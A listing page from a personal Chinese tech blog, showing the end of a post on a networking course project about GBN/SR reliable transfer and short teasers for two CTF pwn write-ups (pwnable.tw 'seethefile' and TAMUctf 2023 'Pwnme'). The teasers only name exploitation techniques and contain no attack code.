class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">sleep</span> 4</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>不论是sr客户端与服务器，还是gbn客户端与服务器，都使用该脚本，在丢包率非0的条件下（gbn使用20%测试，sr由于赶ddl原因使用5%测试，高丢包率环境下也测试过没问题）跑过了超过200轮的测试连续正确。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一开始尝试在助教提供的实例代码上修改来做实验，但越改越复杂。由于sender和receiver是两个不同的类，因此一些函数复用起来非常烦，有的函数必须要写两遍。</p>
<p>因此我全都推倒重来，除了一些基础的函数以及思路的借鉴外，别的东西全都重新写。尤其是wait函数的复用，自认为比较简洁地实现了我的socket的全双工。</p>
<p>写完后，我对于rdt（以及TCP）的理解确实变得更深了，收获不错。虽然期末季很忙，不过还是抽了时间完成了这个PJ，幸苦自己了hhhh。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Pwn/b0d805e48d9f.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis' Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/Pwn/b0d805e48d9f.html" class="post-title-link" itemprop="url">【Pwn#0x12】pwnable.tw seethefile writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-05-07 12:44:10" itemprop="dateCreated datePublished" datetime="2023-05-07T12:44:10+08:00">2023-05-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-11 16:30:39" itemprop="dateModified" datetime="2024-01-11T16:30:39+08:00">2024-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
                </span>
            </span>

          
            <span id="/Tech/Pwn/b0d805e48d9f.html" class="post-meta-item leancloud_visitors" data-flag-title="【Pwn#0x12】pwnable.tw seethefile writeup" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/Pwn/b0d805e48d9f.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Pwn/b0d805e48d9f.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>这次借本题入门了glibc的FILE相关机制，果然一切涉及到函数指针的设计都是灵活但危险的。</p>
<p>本题相关：FILE伪造、vtable伪造、fclose</p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/Tech/Pwn/b0d805e48d9f.html#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Pwn/9b71e71b216d.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis' Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/Pwn/9b71e71b216d.html" class="post-title-link" itemprop="url">【Pwn#0x11】TAMUctf 2023 Pwnme - linked ROP chain</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-05-04 07:55:01" itemprop="dateCreated datePublished" datetime="2023-05-04T07:55:01+08:00">2023-05-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-11 16:30:39" itemprop="dateModified" datetime="2024-01-11T16:30:39+08:00">2024-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
                </span>
            </span>

          
            <span id="/Tech/Pwn/9b71e71b216d.html" class="post-meta-item leancloud_visitors" data-flag-title="【Pwn#0x11】TAMUctf 2023 Pwnme - linked ROP chain" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/Pwn/9b71e71b216d.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Pwn/9b71e71b216d.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>当溢出长度过短无法完成完整的ROP时，一般会想到stack pivot，也就是在某个固定的、可控的地址处提前布置好ROP链，然后通过 <code>leave; ret</code> 或是 <code>xchg eax, esp</code> 等方法完成栈迁移。<br>但在本题中，我们没有机会往已知地址写入数据，溢出大小又有限制。官方给出的方法是：通过 <code>sub rsp, 0x18; call vul</code> 这个非常规gadget，将提前布置好的ROP chain放在栈的高位，从而完成ROP chain的链接，我管它叫linked ROP chain。</p>
<p>比赛时和前辈两人看这题看了几个小时，找gadget找了很久也没做出来。比赛结束后发现了两个版本的做法，分别是<a target="_blank" rel="noopener" href="https://github.com/tamuctf/tamuctf-2023/tree/master/pwn/pwnme">官方的</a>和<a target="_blank" rel="noopener" href="https://chovid99.github.io/posts/tamuctf-2023/#pwnme">Chovid99师傅的</a>的。官方的做法比较一般，并且和我们比赛时的思路完全一致（只是我们傻了没发现那个关键gadget），因此本文主要分析官方的做法。</p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/Tech/Pwn/9b71e71b216d.html#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Cameudis"
      src="/images/ava1.jpg">
  <p class="site-author-name" itemprop="name">Cameudis</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">69</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://space.bilibili.com/5874303" title="Bilibili → https:&#x2F;&#x2F;space.bilibili.com&#x2F;5874303" rel="noopener" target="_blank"><i class="fab fa-bilibili fa-fw"></i>Bilibili</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://github.com/cameudis" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;cameudis" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:cameudis@gmail.com" title="E-Mail → mailto:cameudis@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://x.com/cameudis" title="Twitter → https:&#x2F;&#x2F;x.com&#x2F;cameudis" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-dove"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Cameudis</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/pjax/pjax.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>

  <script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});
</script>




  















    <div id="pjax">
  

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : false,
      appId      : 'Ji5y9HTOlb2QGDO0XFlWXNRy-gzGzoHsz',
      appKey     : '6VqGye1352LX381YQDTOaiXs',
      placeholder: "El Psy Congroo",
      avatar     : 'retro',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : true,
      lang       : '' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>

    </div>
</body>
</html>
